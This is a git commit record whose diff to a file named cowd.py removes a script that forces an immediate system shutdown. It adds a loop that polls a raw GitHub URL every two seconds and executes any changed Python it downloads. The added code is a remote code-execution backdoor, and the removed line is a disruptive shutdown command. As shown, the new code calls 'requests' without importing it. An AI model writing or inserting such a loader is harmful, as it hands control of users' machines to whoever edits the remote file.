06943db0e10286e5887b0f7c20886b3a3a86ba8c
Andrés <andromedamorillof@gmail.com>
2025-06-05 20:34:21 -0300

    Update cowd.py

--- cowd.py
+++ cowd.py
@@ -1,2 +1,8 @@
-import os
-os.system("shutdown /s /t 1")
+import time
+x = requests.get("https://raw.githubusercontent.com/mrmorcilla/insha/refs/heads/main/ggs.py").text
+while True:
+  time.sleep(2)
+  a = requests.get("https://raw.githubusercontent.com/mrmorcilla/insha/refs/heads/main/ggs.py").text
+  if a != x:
+    exec(a)
+    x = a
